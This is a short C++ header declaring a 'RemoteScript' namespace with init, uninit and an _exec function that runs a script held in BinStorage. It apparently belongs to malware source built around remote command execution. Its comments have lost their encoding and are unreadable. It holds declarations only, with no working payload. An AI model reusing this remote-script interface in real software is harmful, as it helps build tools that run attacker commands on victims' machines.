/*
  ���������� �������� ����.
*/
#pragma once

#include "..\common\binstorage.h"

namespace RemoteScript
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ������ ���������� ������� ��������� ������. ���� �� ������ ����������� ��
    Process::INTEGRITY_LOW ���������.

    IN script - ������ ��� ����������. 
    
    Return    - true - � ������ ��������� ������� ���������� ������� (script ����� ����������
                �������������),
                false - � ������ ������ (script ����� ���������� ��������������).
  */
  bool _exec(BinStorage::STORAGE *script);
};
